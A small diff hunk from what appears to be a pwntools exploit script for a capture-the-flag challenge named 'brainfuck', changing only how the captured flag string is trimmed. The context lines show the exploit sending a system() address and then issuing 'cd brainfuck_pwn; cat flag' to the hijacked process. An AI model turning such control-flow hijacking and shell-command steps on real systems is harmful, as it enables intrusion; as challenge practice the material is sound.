@@ -59,7 +59,7 @@ r.send(system_addr_str)
 
 # Now we are running in main and it expects for input from fgets
 r.sendline(b"cd brainfuck_pwn; cat flag")
-flag = r.recv().decode()[1:-1]
+flag = r.recv().decode()[:-1]
 
 # After scanned through string ___stack_chk_fail (which is system supposed to be called)
 r.close()
